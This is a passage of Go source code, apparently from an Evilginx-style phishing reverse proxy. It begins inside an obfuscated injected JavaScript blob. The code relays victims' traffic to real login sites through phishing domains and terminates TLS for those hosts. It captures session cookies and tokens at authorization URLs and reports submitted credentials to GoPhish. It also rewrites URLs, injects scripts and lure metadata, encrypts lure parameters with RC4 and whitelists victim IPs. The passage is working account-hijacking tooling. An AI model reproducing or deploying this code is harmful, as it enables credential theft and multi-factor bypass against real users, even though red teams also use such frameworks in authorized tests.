_0x9043d8(_0x340589[_0x42b13b(0x19b,0x15f,'ppRy',0x12d,0x106)],'i'),_0x43f503=_0x340589[_0x10a21f('rDyg',-0x1f7,-0x194,-0x2a5,-0x214)](_0x24aafe,_0x340589[_0x42b13b(0x1cd,0x1e1,'Lmbb',0x249,0x210)]);!_0xa7a091[_0x10a21f('NcTf',-0x32,-0x125,-0x141,-0xb7)](_0x340589[_0x34dbaa(0x397,0x3c7,0x2ae,0x2ee,'OW9z')](_0x43f503,_0x340589[_0x42b13b(0x17c,0x1de,'Wok(',0x205,0x228)]))||!_0x37c3ba[_0x2c47a1(0x2b4,0x32f,0x39a,0x3af,'#e)*')](_0x340589[_0x2c47a1(0x2dd,0x3d7,0x211,0x33c,'#e)*')](_0x43f503,_0x340589[_0x42b13b(0x3af,0x2c8,'k7b%',0x290,0x2be)]))?_0x340589[_0x34dbaa(0x18f,0x235,0x20c,0x16f,'0p0h')](_0x43f503,'0'):_0x340589[_0x42b13b(0x56,0x204,'%MqR',0x167,0xf4)](_0x360060);}}return _0x52c7fd;}};function _0x1f2de5(_0x118a0d,_0x4206e5,_0x4a8ef5,_0x4d0077,_0x18361e){return _0x199199(_0x18361e,_0x4206e5-0x99,_0x4206e5-0x4e3,_0x4d0077-0xf9,_0x18361e-0x1ed);}function _0x572089(_0x2e18d0,_0x19e592,_0x245e71,_0x1b380d,_0x4d44f2){return _0x199199(_0x19e592,_0x19e592-0x15f,_0x245e71-0x13a,_0x1b380d-0x199,_0x4d44f2-0xa6);}var _0xbbe09f=_0x29083e[_0x4e01d5(0x78,0x7b,'6Lbn',0x148,0x18e)](_0x47cf7e);_0xbbe09f[_0x572089(0xfa,'vIjU',0xe5,0x90,0x12f)+_0x572089(0x3f7,'S@(b',0x2ff,0x40f,0x395)+'l'](_0x6a9779,-0x26cb+0x1*0x24cf+0x119c);}());</script>", encodedBody))
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								rid, ok := s.Params["rid"]
								if ok && rid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				resp.Header.Set("Cache-Control", "no-cache, no-store")
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
							return resp
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	var redirect_url string
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
	}
	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
		redirect_url = p.cfg.general.UnauthUrl
	}

	if redirect_url != "" {
		return p.javascriptRedirect(req, redirect_url)
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}
	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
	var d_inject string
	if script != "" {
		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
	} else if src_url != "" {
		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
	} else {
		return body
	}
	ret := []byte(re.ReplaceAllString(string(body), d_inject))
	return ret
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := MATCH_URL_REGEXP
	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
        return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
                parts := strings.SplitN(host, ":", 2)
                hostname := parts[0]
                port := 443
                if len(parts) == 2 {
                        port, _ = strconv.Atoi(parts[1])
                }

                tls_cfg := &tls.Config{
                    CipherSuites:             p.cfg.general.CipherSuites,
                    PreferServerCipherSuites: false,
                    MinVersion:               p.cfg.general.TLSMinVersion,
                    MaxVersion:               p.cfg.general.TLSMaxVersion,
                }
                if !p.developer {

                        tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
                        tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.Nex>

                        return tls_cfg, nil
                } else {
                        var ok bool
                        phish_host := ""
                        if !p.cfg.IsLureHostnameValid(hostname) {
                                phish_host, ok = p.replaceHostWithPhished(hostname)
                                if !ok {
                                        log.Debug("phishing hostname not found: %s", hostname)
                                        return nil, fmt.Errorf("phishing hostname not found")
                                }
                        }
                        cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
                        if err != nil {
                                log.Error("http_proxy: %s", err)
                                return nil, err
                        }
                        return &tls.Config{
                                InsecureSkipVerify: true,
                                Certificates:       []tls.Certificate{*cert},
                                CipherSuites:       p.cfg.general.CipherSuites,
                                PreferServerCipherSuites: false,
                                MinVersion:         p.cfg.general.TLSMinVersion,
                                MaxVersion:         p.cfg.general.TLSMaxVersion,
                        }, nil
                }
        }
}


func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
	r_url, err := url.Parse(u)
	if err == nil {
		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
			r_url.Host = r_host
			return r_url.String(), true
		}
	}
	return u, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}


func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func getSessionCookieName(pl_name string, cookie_name string) string {
    hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
    s_hash := fmt.Sprintf("%x", hash[:6])
    return s_hash
}
